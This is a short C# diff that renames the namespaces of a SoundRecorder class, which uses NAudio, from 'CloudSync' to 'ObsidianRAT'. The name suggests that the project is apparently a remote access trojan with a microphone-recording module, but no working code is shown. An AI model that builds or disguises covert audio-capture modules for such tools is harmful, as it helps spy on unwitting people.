@@ -1,4 +1,4 @@
-﻿using CloudSync.Services.Core;
+﻿using ObsidianRAT.Services.Core;
 using NAudio.Wave;
 using System;
 using System.Collections.Generic;
@@ -8,7 +8,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 
-namespace CloudSync.Services.Modules
+namespace ObsidianRAT.Services.Modules
 {
     public class SoundRecorder
     {
